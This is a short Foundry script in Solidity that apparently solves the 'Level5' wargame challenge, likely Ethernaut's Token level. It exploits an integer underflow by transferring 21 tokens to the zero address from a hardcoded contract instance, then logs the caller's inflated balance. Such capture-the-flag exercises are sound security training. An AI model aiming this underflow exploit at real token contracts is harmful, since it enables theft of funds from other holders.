// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;


import{Script,console} from "forge-std/Script.sol";
import{Token} from "../src/Level5.sol";

/**
 * To crack the contract objective, take advantage of underflow and overflow 
 */
contract Level5 is Script{
        Token token=Token(0xB1a7B25a519b2bd621F306C6D4755876fC5E82D6); //instance

        function run() public{
            console.log("my account balance before hack:",token.balanceOf(vm.envAddress("MY_ADDRESS")));
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            token.transfer(address(0),21);   //transferring 21 tokens 
            vm.stopBroadcast();
            console.log("my account balance after hack:",token.balanceOf(vm.envAddress("MY_ADDRESS")));
        }
}
